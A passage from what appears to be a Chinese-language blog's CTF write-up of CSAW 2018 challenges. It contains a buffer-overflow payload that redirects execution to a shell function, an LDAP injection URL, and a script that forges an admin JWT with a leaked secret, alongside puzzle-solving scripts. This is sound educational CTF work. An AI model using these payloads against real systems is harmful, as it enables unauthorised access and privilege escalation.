e8 af fe ff ff          callq  4004a0 &lt;gets@plt&gt;</span><br><span class="line">  4005f1:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  4005f6:   c9                      leaveq </span><br><span class="line">  4005f7:   c3                      retq   </span><br><span class="line">  4005f8:   0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4005ff:   00</span><br></pre></td></tr></table></figure><p>注意这两个函数,<code>main</code>中<code>gets</code>非常可疑,再查看下<code>give_shell</code>函数<code>0x400684</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x400684</span><br><span class="line">0x400684:   &quot;/bin/bash&quot;</span><br></pre></td></tr></table></figure><p>这是要调用<code>system(&quot;/bin/bash&quot;);</code>搞事啊！！！那就来一波ida F5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; // [rsp+10h] [rbp-20h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Do you gets it??&quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int give_shell()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gets(char * s)</code>接受一个参数，它将写入的内存中的位置，然后它将写入你输入的所有字符,<code>lea</code>指令只是做了一些数学运算。在这里表示<code>rax = rbp - 0x20</code>,顺便说一句，<code>0x20 = 32</code>,我们用<code>A</code>来填充获取的局部变量缓冲区。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break *0x00000000004005f6</span><br><span class="line">Breakpoint 1 at 0x4005f6</span><br><span class="line">(gdb) run</span><br><span class="line">Starting program: /get_it </span><br><span class="line">Do you gets it??</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00000000004005f6 in main ()</span><br><span class="line">(gdb) x/6xg $rbp - 0x20</span><br><span class="line">0x7fffffffde90: 0x4141414141414141  0x4141414141414141</span><br><span class="line">0x7fffffffdea0: 0x4141414141414141  0x4141414141414141</span><br><span class="line">0x7fffffffdeb0: 0x0000000000400600  0x00007ffff7e11b17</span><br></pre></td></tr></table></figure><p>测试一下<br><code>python -c &quot;print &#39;A&#39; * 32 + &#39;B&#39;*8 + &#39;\xb6\x05@\x00\x00\x00\x00\x00&#39;&quot; &gt; test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run &lt; test</span><br><span class="line">Starting program: /get_it &lt; test</span><br><span class="line">Do you gets it??</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00000000004005f6 in main ()</span><br><span class="line">(gdb) x/6xg $rbp - 0x20</span><br><span class="line">0x7fffffffde90: 0x4141414141414141  0x4141414141414141</span><br><span class="line">0x7fffffffdea0: 0x4141414141414141  0x4141414141414141</span><br><span class="line">0x7fffffffdeb0: 0x4242424242424242  0x00000000004005b6</span><br><span class="line">(gdb)  nexti</span><br><span class="line">0x00000000004005f7 in main ()</span><br><span class="line">(gdb)  nexti</span><br><span class="line">0x00000000004005b6 in give_shell ()</span><br></pre></td></tr></table></figure><p>ok,进入<code>give_shell</code></p><p><img src="https://i.loli.net/2018/09/19/5ba251939684a.png" alt=""></p><p>flag:<code>flag{y0u_deF_get_itls}</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Short-Circuit"><a href="#Short-Circuit" class="headerlink" title="Short Circuit"></a>Short Circuit</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Start from the monkey&apos;s paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format.</span><br><span class="line"></span><br><span class="line">Elyk</span><br></pre></td></tr></table></figure></p><p>下载图片下来</p><p><img src="https://i.loli.net/2018/09/18/5ba0fe4a7da94.jpg" alt=""></p><p>这个就是很多个LED灯连在一起，分析一下，连了地线的表示<code>&quot;1&quot;</code>,其他表示<code>&quot;0&quot;</code>,</p><p><img src="https://i.loli.net/2018/09/18/5ba0fe08dedfe.png" alt=""></p><p>最后表示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">01100110 01101100 01100001 01100111 01111011 01101111 01110111 01101101 01111001</span><br><span class="line">01101000 01100001 01101110 01100100 01111101</span><br></pre></td></tr></table></figure></p><p>flag:<code>flag{owmyhand}</code></p><h3 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Are you a real math wiz?</span><br><span class="line"></span><br><span class="line">nc misc.chal.csaw.io 9002</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/09/18/5ba1058f8c4ad.png" alt=""></p><p>就是根据他的等式来接<code>X</code>,题目会越来越难,写个脚本就可以解开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"misc.chal.csaw.io"</span>, <span class="number">9002</span>)</span><br><span class="line">r.recvuntil(<span class="string">"*********"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    task = r.recvline()</span><br><span class="line">    <span class="keyword">print</span> task</span><br><span class="line">    <span class="keyword">print</span> r.recvuntil(<span class="string">"What does X equal?: "</span>)</span><br><span class="line">    eq1 = task.replace(<span class="string">"="</span>,<span class="string">"-("</span>)+<span class="string">")"</span></span><br><span class="line">    c = eval(eq1,&#123;<span class="string">"X"</span>:<span class="number">1j</span>&#125;)</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> c.imag != <span class="number">0</span>:</span><br><span class="line">        result = -c.real/c.imag</span><br><span class="line">    r.sendline(str(result))</span><br><span class="line">    <span class="keyword">print</span> r.recvline()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/09/18/5ba10699ef1e8.png" alt=""></p><p>flag:<code>flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5}</code></p><h3 id="Take-an-L"><a href="#Take-an-L" class="headerlink" title="Take an L"></a>Take an L</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Fill the grid with L&apos;s but avoid the marked spot for the W</span><br><span class="line">nc misc.chal.csaw.io 9000</span><br><span class="line">The origin is at (0,0) on the top left</span><br></pre></td></tr></table></figure></p><p>通过google,发现了<a href="https://www.geeksforgeeks.org/tiling-problem-using-divide-and-conquer-algorithm/" target="_blank" rel="noopener">这个</a></p><p>使用的算法是recursiv,我们在网格的中间放置一个<code>“L”</code>（L-tromino），然后我们将网格分割成子网格，并为每个子网格执行相同的过程。当网格与我们的<code>“L”</code>（2 * 2）大小相同时，递归函数停止。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">HOST = <span class="string">"misc.chal.csaw.io"</span></span><br><span class="line">PORT = <span class="number">9000</span></span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(c)</span>:</span></span><br><span class="line">    print(c)</span><br><span class="line">    r.sendline(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rec =  r.recvuntil(<span class="string">"marked block: "</span>)</span><br><span class="line">print(rec)</span><br><span class="line">black = eval(r.recvuntil(<span class="string">"\n"</span>).strip())</span><br><span class="line">print(<span class="string">"Black cell: "</span>+str(black))</span><br><span class="line"></span><br><span class="line">n = <span class="number">64</span> </span><br><span class="line">a = [[<span class="string">' '</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(n)] <span class="keyword">for</span> y <span class="keyword">in</span> range(n)] </span><br><span class="line">a[black[<span class="number">1</span>]][black[<span class="number">0</span>]] = <span class="string">"@"</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pgrille</span><span class="params">()</span>:</span></span><br><span class="line">    out = <span class="string">""</span></span><br><span class="line">    out += <span class="string">"-"</span>*n</span><br><span class="line">    out += <span class="string">"\n"</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> a:</span><br><span class="line">        out += str(<span class="string">''</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> l]))+<span class="string">"\n"</span></span><br><span class="line">    out += <span class="string">"-"</span>*n</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"logs"</span>,<span class="string">"a+"</span>) <span class="keyword">as</span> fi:</span><br><span class="line">        fi.write(out+<span class="string">"\n\n\n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBlack</span><span class="params">(a,x_start,y_start,x_end,y_end)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(y_start,y_end+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x_start,x_end+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> a[j][i] == <span class="string">"o"</span> <span class="keyword">or</span> a[j][i] == <span class="string">"@"</span>:</span><br><span class="line">                <span class="keyword">return</span> i,j</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span>,<span class="keyword">None</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Tile</span><span class="params">(a,x_start,y_start,x_end,y_end)</span>:</span></span><br><span class="line">    xcenter_left = x_start+((x_end-x_start)/<span class="number">2</span>)</span><br><span class="line">    xcenter_right = xcenter_left+<span class="number">1</span></span><br><span class="line">    ycenter_top = y_start+((y_end-y_start)/<span class="number">2</span>)</span><br><span class="line">    ycenter_bottom = ycenter_top+<span class="number">1</span></span><br><span class="line">    xBlack,yBlack = getBlack(a,x_start,y_start,x_end,y_end)</span><br><span class="line">    <span class="keyword">if</span> xBlack &lt;= xcenter_left: </span><br><span class="line">        <span class="keyword">if</span> yBlack &lt;= ycenter_top: </span><br><span class="line">            a[ycenter_top][xcenter_right] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_bottom][xcenter_right] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_bottom][xcenter_left] = <span class="string">"o"</span></span><br><span class="line">            send(<span class="string">"("</span>+str(xcenter_right)+<span class="string">","</span>+str(ycenter_top)+<span class="string">"),("</span>+str(xcenter_right)+<span class="string">","</span>+str(ycenter_bottom)+<span class="string">"),("</span>+str(xcenter_left)+<span class="string">","</span>+str(ycenter_bottom)+<span class="string">")"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a[ycenter_top][xcenter_left] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_top][xcenter_right] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_bottom][xcenter_right] = <span class="string">"o"</span></span><br><span class="line">            send(<span class="string">"("</span>+str(xcenter_left)+<span class="string">","</span>+str(ycenter_top)+<span class="string">"),("</span>+str(xcenter_right)+<span class="string">","</span>+str(ycenter_top)+<span class="string">"),("</span>+str(xcenter_right)+<span class="string">","</span>+str(ycenter_bottom)+<span class="string">")"</span>)</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">if</span> yBlack &lt;= ycenter_top: </span><br><span class="line">            a[ycenter_top][xcenter_left] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_bottom][xcenter_left] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_bottom][xcenter_right] = <span class="string">"o"</span></span><br><span class="line">            send(<span class="string">"("</span>+str(xcenter_left)+<span class="string">","</span>+str(ycenter_top)+<span class="string">"),("</span>+str(xcenter_left)+<span class="string">","</span>+str(ycenter_bottom)+<span class="string">"),("</span>+str(xcenter_right)+<span class="string">","</span>+str(ycenter_bottom)+<span class="string">")"</span>)</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            a[ycenter_bottom][xcenter_left] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_top][xcenter_left] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_top][xcenter_right] = <span class="string">"o"</span></span><br><span class="line">            send(<span class="string">"("</span>+str(xcenter_left)+<span class="string">","</span>+str(ycenter_bottom)+<span class="string">"),("</span>+str(xcenter_left)+<span class="string">","</span>+str(ycenter_top)+<span class="string">"),("</span>+str(xcenter_right)+<span class="string">","</span>+str(ycenter_top)+<span class="string">")"</span>)</span><br><span class="line">    </span><br><span class="line">    pgrille() </span><br><span class="line">    <span class="keyword">if</span> abs(x_end-x_start) &gt; <span class="number">1</span>: </span><br><span class="line">        Tile(a,x_start,y_start,xcenter_left,ycenter_top)</span><br><span class="line">        Tile(a,xcenter_right,y_start,x_end,ycenter_top)</span><br><span class="line">        Tile(a,x_start,ycenter_bottom,xcenter_left,y_end)</span><br><span class="line">        Tile(a,xcenter_right,ycenter_bottom,x_end,y_end)</span><br><span class="line">    </span><br><span class="line">Tile(a,<span class="number">0</span>,<span class="number">0</span>,len(a[<span class="number">0</span>])<span class="number">-1</span>,len(a)<span class="number">-1</span>) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>参考大佬<a href="https://www.aperikube.fr/docs/csawquals_2018/takeanl/" target="_blank" rel="noopener">代码</a></p><p>flag:<code>flag{m@n_that_was_sup3r_hard_i_sh0uld_have_just_taken_the_L}</code></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Ldab"><a href="#Ldab" class="headerlink" title="Ldab"></a>Ldab</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dab</span><br><span class="line">http://web.chal.csaw.io:8080</span><br></pre></td></tr></table></figure></p><p>一个简单的LDAP注入</p><p>payload:<code>http://web.chal.csaw.io:8080/index.php/index.php?search=*)(uid=*))(|(uid=*</code></p><p><img src="https://i.loli.net/2018/09/18/5ba1062506e4c.png" alt=""></p><p>flag:<code>flag{ld4p_inj3ction_i5_a_th1ng}</code></p><h3 id="sso"><a href="#sso" class="headerlink" title="sso"></a>sso</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Be the admin you were always meant to be</span><br><span class="line">http://web.chal.csaw.io:9000</span><br><span class="line">Update chal description at: 4:38 to include solve details</span><br><span class="line">Aesthetic update for chal at Sun 7:25 AM</span><br></pre></td></tr></table></figure></p><p>首先查看源码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/protected"</span>&gt;</span>.<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Wish we had an automatic GET route for /authorize... well they'll just have to POST from their own clients I guess</span></span><br><span class="line"><span class="comment">POST /oauth2/token</span></span><br><span class="line"><span class="comment">POST /oauth2/authorize form-data <span class="doctag">TODO:</span> make a form for this route--!&gt;</span></span><br></pre></td></tr></table></figure></p><p>根据判断应该是基于OAuth2.0协议的身份验证,<br>不了解的童鞋可以看看这篇文章<br><a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc6749</a><br><a href="https://tools.ietf.org/html/rfc6750" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc6750</a><br><a href="https://blog.csdn.net/cd_xuyue/article/details/52084220" target="_blank" rel="noopener">https://blog.csdn.net/cd_xuyue/article/details/52084220</a></p><p>首先我要获取一个<code>code</code>，用burp抓包<a href="http://web.chal.csaw.io:9000/protected" target="_blank" rel="noopener">http://web.chal.csaw.io:9000/protected</a></p><p>在<code>/oauth2/authorize</code>中<code>response_type</code>必须要填，而且为<code>code</code>，<code>redirect_uri</code>将传递给重定向端点的绝对URI</p><p><img src="https://i.loli.net/2018/09/19/5ba1e58588ed7.png" alt=""></p><p>我们将返回一个<code>code</code>,我们再次修改数据包发送<code>Access Token Request</code></p><p><img src="https://i.loli.net/2018/09/19/5ba1e65d8339e.png" alt=""></p><p><code>code</code>的参数就是刚才返回的<code>code</code>值，这样我们将得到一个<code>token</code>，这个要使用jwt解码才能看见里面的内容,</p><p>jwt解码网站<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><p><img src="https://i.loli.net/2018/09/19/5ba1e735132c5.png" alt=""></p><p>根据题目提示，我们要将<code>type</code>改成<code>admin</code>才可以</p><p>参考大佬的加密脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_tokens</span><span class="params">(jwt)</span>:</span></span><br><span class="line">    p1, p2, p3 = jwt.split(<span class="string">'.'</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    header = decode_token(p1)</span><br><span class="line">    payload = decode_token(p2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> header, payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_token</span><span class="params">(token)</span>:</span></span><br><span class="line">    token_len = len(token)</span><br><span class="line">    padded_token = token.ljust(token_len + (token_len % <span class="number">4</span>), <span class="string">'='</span>)</span><br><span class="line">    dict_ = json.loads(base64.b64decode(padded_token), object_pairs_hook=OrderedDict)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dict_</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_encode</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).decode().strip(<span class="string">'='</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_token</span><span class="params">(dict_)</span>:</span></span><br><span class="line">    json_data = json.dumps(dict_, separators=(<span class="string">','</span>, <span class="string">':'</span>)).encode()</span><br><span class="line">    token = base64_encode(json_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_token</span><span class="params">(header, payload, secret)</span>:</span></span><br><span class="line">    jwt = encode_token(header) + <span class="string">'.'</span>  <span class="comment"># header</span></span><br><span class="line">    jwt += encode_token(payload) + <span class="string">'.'</span>  <span class="comment"># payload</span></span><br><span class="line">    signature = base64_encode(hmac.new(secret.encode(), jwt[:<span class="number">-1</span>].encode(), hashlib.sha256).digest())</span><br><span class="line">    signature = signature.replace(<span class="string">'/'</span>, <span class="string">'_'</span>).replace(<span class="string">'+'</span>, <span class="string">'-'</span>)</span><br><span class="line">    jwt += signature</span><br><span class="line">    <span class="keyword">return</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">f'Usage <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;jwt&gt;'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    header, payload = dump_tokens(sys.argv[<span class="number">1</span>])  <span class="comment"># get original JWT as dict</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">f'''Original JWT values:</span></span><br><span class="line"><span class="string">    * header: <span class="subst">&#123;dict(header)&#125;</span></span></span><br><span class="line"><span class="string">    * payload: <span class="subst">&#123;dict(payload)&#125;</span></span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">    new_header = header</span><br><span class="line">    new_payload = payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Update user type</span></span><br><span class="line">    new_payload[<span class="string">'type'</span>] = <span class="string">'admin'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Update expiration time</span></span><br><span class="line">    unix_ts = int(time.time())</span><br><span class="line">    flag_window = <span class="number">600</span></span><br><span class="line">    new_payload[<span class="string">'iat'</span>] = unix_ts</span><br><span class="line">    new_payload[<span class="string">'exp'</span>] = unix_ts + flag_window</span><br><span class="line"></span><br><span class="line">    print(<span class="string">f'''New JWT values:</span></span><br><span class="line"><span class="string">    * header: <span class="subst">&#123;dict(header)&#125;</span></span></span><br><span class="line"><span class="string">    * payload: <span class="subst">&#123;dict(payload)&#125;</span></span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Generate new JWT (signature)</span></span><br><span class="line">    new_jwt = sign_token(header, payload, payload[<span class="string">'secret'</span>])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">f'New signed JWT: <span class="subst">&#123;new_jwt&#125;</span>'</span>)</span><br></pre></td></tr></table></figure></p><p>运行脚本</p><p><img src="https://i.loli.net/2018/09/19/5ba1e7d01897a.png" alt=""></p><p>得到新的<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzczMzcyNTcsImV4cCI6MTUzNzMzNzg1N30.LVpR0h6soIt3A3IRqis-T1nywLn_D_taJQhFTZdw9SE</code></p><p>重新发送</p><p><img src="https://i.loli.net/2018/09/19/5ba1e834ab3c5.png" alt=""></p><p>flag:<code>flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}</code></p><p><a href="https://gitlab.com/mahham/ctf/blob/master/2018-csaw/Readme.md#babycrypto-50-crypto" target="_blank" rel="noopener">https://gitlab.com/mahham/ctf/blob/master/2018-csaw/Readme.md#babycrypto-50-crypto</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首发安全脉搏:&lt;a href=&quot;https://www.secpulse.com/archives/75785.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.secpulse.com/archives/75785.html
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>netcat食用指南</title>
    <link href="https://threst.github.io/2018/10/04/Netcat/"/>
    <id>https://threst.github.io/2018/10/04/Netcat/</id>
    <published>2018-10-04T05:34:13.000Z</published>
    <updated>2018-10-04T07:22:07.318Z</updated>
    
